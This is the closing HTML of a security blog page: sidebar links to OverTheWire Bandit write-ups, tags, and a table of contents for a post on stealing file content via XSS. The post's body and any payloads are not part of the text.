        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-0-level-1/">Bandit: Level 0 =&gt; Level 1</a></div>
        
        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-1-level-2/">Bandit: Level 1 =&gt; Level 2</a></div>
        
        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-2-level-3/">Bandit: Level 2 =&gt; Level 3</a></div>
        
        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-3-level-4/">Bandit: Level 3 =&gt; Level 4</a></div>
        
        <div><a href="http://localhost:1313/posts/overthewire-bandit/bandit-level-4-level-5/">Bandit: Level 4 =&gt; Level 5</a></div>
        
    </section>

    <section>
        <h2>Trending Tags</h2>
                                          
        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
                                                                                                                                                                                                                                  
        <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                   
    </section>

    <section id="post-content">
        <h2>Table of Content</h2>
        <nav id="TableOfContents">
  <ul>
    <li><a href="#1-steal-file-content-using-inline-xss-script-html">1. Steal File Content Using Inline XSS Script (HTML)</a>
      <ul>
        <li><a href="#explanation">Explanation:</a></li>
        <li><a href="#how-to-use">How to use:</a></li>
      </ul>
    </li>
    <li><a href="#2-external-js-file-to-steal-file-content-via-xss-javascript">2. External JS File to Steal File Content via XSS (JavaScript)</a>
      <ul>
        <li><a href="#explanation-1">Explanation:</a></li>
        <li><a href="#how-to-use-1">How to use:</a></li>
      </ul>
    </li>
    <li><a href="#summary-notes">Summary Notes:</a></li>
  </ul>
</nav>
    </section>
</div>



        <div class="search-results-wrapper">
          <div class="search-results-list">
          </div>
        </div>
      </div>
    </main>
  </div>

  
  <button id="scrollToTop" class="scroll-to-top">
    <i class="fa-solid fa-arrow-up"></i>
  </button>
  

  <div class="mobile-search-layout">
    <header>
      <div class="search-container"><span class="absolute left-3 top-2.5 text-gray-400">
          <i class="fas fa-search"></i>
        </span>
        <input id="mobile-search-input" type="text" placeholder="Search..."
          class="w-full border rounded-lg py-2 pl-10 pr-4 focus:outline-none focus:ring-2 focus:ring-blue-500" />
      </div><button class="cancel-btn">Cancel</button>
    </header>
    <div class="search-results-list mobile-search-results-list"></div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/fuse.js@6.6.2"></script>
  
  <script src="/js/main.min.6cd0146acf9838eb3d5ac7ebaad0cd534927930fd1c398e8847e358ea1dedbff.js" integrity="sha256-bNAUas&#43;YOOs9WsfrqtDNU0knkw/Rw5johH41jqHe2/8="></script>
</body>

</html>